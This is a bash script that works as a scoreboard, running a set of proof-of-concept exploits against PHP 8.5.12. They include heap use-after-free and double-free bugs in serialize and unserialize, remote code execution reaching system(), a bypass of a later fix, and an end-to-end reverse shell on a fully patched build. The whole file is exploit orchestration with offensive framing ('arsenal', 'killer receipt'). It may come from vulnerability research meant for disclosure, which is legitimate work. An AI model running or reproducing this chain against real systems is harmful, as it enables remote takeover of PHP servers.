#!/bin/bash
# ============================================================================
# RUN_ALL_ZEROS.sh — the whole arsenal, one command, PASS/FAIL scoreboard.
# Every line runs a self-contained repro and prints its receipt class.
# Prereqs (see README): plain2 (8.5.12), asan2 (ASAN), fixedasan (08f4b64),
# and the system php (8.1.2) + up_client.py for the chain lanes.
# ============================================================================
Z=/mnt/c/Users/andre/Downloads/php2shell-zeros
P=/tmp/php8512_build/plain2/sapi/cli/php
A=/tmp/php8512_build/asan2/sapi/cli/php
F=/tmp/php8512_build/fixedasan/sapi/cli/php
PASS=0; FAIL=0
ok(){ echo "[PASS] $1"; PASS=$((PASS+1)); }
bad(){ echo "[FAIL] $1"; FAIL=$((FAIL+1)); }

echo "==================== php2shell-zeros arsenal ===================="

echo "--- Z1: session-gap RCE (key injection -> gadget -> uid) ---"
OUT=$(timeout 200 bash $Z/zero1_session_gaps/repro/fin_8512.sh 2>&1)
echo "$OUT" | grep -q "A5 RCE receipt on 8.5.12" && ok "Z1 RCE on 8.5.12 (uid receipt in fin output)" || bad "Z1 RCE (rerun fin_8512.sh)"

echo "--- Z2: GC double-free regression (regression shipped IN the patch) ---"
cd /tmp; cp $Z/zero2_gc_regression/poc/v_cast.php . 2>/dev/null
timeout 20 env USE_ZEND_ALLOC=0 $P -n -d zend.enable_gc=1 v_cast.php >/dev/null 2>&1
[ $? -ge 128 ] 2>/dev/null && ok "Z2 GC double-free (glibc tcache abort)" || bad "Z2 GC (rerun v_cast under USE_ZEND_ALLOC=0)"

echo "--- Z4: var_destroy re-entry UAF (ASAN, first demo of the named gap) ---"
cd /tmp; cp $Z/zero4_var_destroy_uaf/poc/vd4_wakeup.php $Z/zero4_var_destroy_uaf/poc/vd1b_dupkey_ok.php . 2>/dev/null
OUT=$(timeout 60 env USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 $A -n vd4_wakeup.php 2>&1)
echo "$OUT" | grep -q "heap-use-after-free" && ok "Z4 UAF (ASAN receipt, var_unserializer.c:906)" || bad "Z4 UAF (rerun vd4 under ASAN)"
timeout 20 env USE_ZEND_ALLOC=0 $P -n vd1b_dupkey_ok.php > /tmp/z4g.txt 2>&1
EC=$?
if [ $EC -ge 128 ] 2>/dev/null || grep -q "Segmentation\|double free" /tmp/z4g.txt 2>/dev/null; then
  ok "Z4 stock-glibc SIGSEGV (core)"
else
  bad "Z4 glibc shape (rerun vd1b under USE_ZEND_ALLOC=0)"
fi

echo "--- Z5: serialize-side mirror UAF (first demo anywhere) ---"
cd /tmp; cp $Z/zero5_serialize_reentry/poc/vd6_carrier.php . 2>/dev/null
OUT=$(timeout 60 env USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 $A -n vd6_carrier.php 2>&1)
echo "$OUT" | grep -q "heap-use-after-free" && ok "Z5 mirror UAF (ASAN receipt, php_var_serialize_destroy)" || bad "Z5 mirror (rerun vd6 under ASAN)"

echo "--- Z5 RCE: serialize mirror -> self-reclaim -> zif_system (unconditional) ---"
timeout 200 bash /mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix/pwn_zero5.sh > /tmp/z5r.log 2>&1
grep -q "uid=" /tmp/z5r.log && ok "Z5 RCE via serialize() on 8.5.12 (marker receipt)" || bad "Z5 RCE (rerun pwn_zero5.sh)"

echo "--- POST-FIX (08f4b64): destructor bypass + leak on the fix itself ---"
if [ -x "$F" ]; then
  cd /tmp; cp /mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix/fb1_bailout_leak.php . 2>/dev/null
  rm -f /tmp/fb1_X /tmp/fb1_Y /tmp/fb1_Z /tmp/fb1_W
  OUT=$(timeout 60 env USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=1 $F -n fb1_bailout_leak.php 2>&1)
  LEAK=$(echo "$OUT" | grep -c "leaked in")
  [ -f /tmp/fb1_X ] && [ ! -f /tmp/fb1_Y ] && [ ! -f /tmp/fb1_Z ] \
    && ok "POST-FIX: destructor bypass (X ran, Y/Z never) + LSan leak receipt" \
    || bad "POST-FIX shape (rerun fb1 on fixedasan)"
else
  echo "[skip] post-fix lane (fixedasan build absent — see README)"
fi

echo "--- E2E: one-command live reverse shell (the killer receipt) ---"
timeout 150 bash $Z/REVSHHELL_E2E.sh > /tmp/e2e_last.log 2>&1
grep -q "PASS] E2E" /tmp/e2e_last.log && ok "E2E reverse shell on fully-patched 8.5.12 (session in /tmp/e2e_last.log)" || bad "E2E revshell (rerun REVSHHELL_E2E.sh)"
tail -14 /tmp/e2e_last.log 2>/dev/null | sed 's/^/    /'

echo "=================================================================="
echo " ARSENAL RESULT: $PASS passed, $FAIL failed"
echo "=================================================================="
